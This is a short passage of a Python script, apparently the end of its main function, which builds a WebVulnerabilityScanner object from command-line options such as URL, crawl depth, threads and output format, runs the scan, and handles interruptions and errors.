    depth = 0 if args.no_crawl else args.depth
    
    try:
        scanner = WebVulnerabilityScanner(
            url=args.url,
            depth=depth,
            max_urls=args.max_urls,
            threads=args.threads,
            timeout=args.timeout,
            delay=args.delay,
            user_agent=args.user_agent,
            output=args.output,
            output_format=args.format
        )
        
        scanner.scan()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"Error during scan: {e}")

if __name__ == "__main__":
    main()
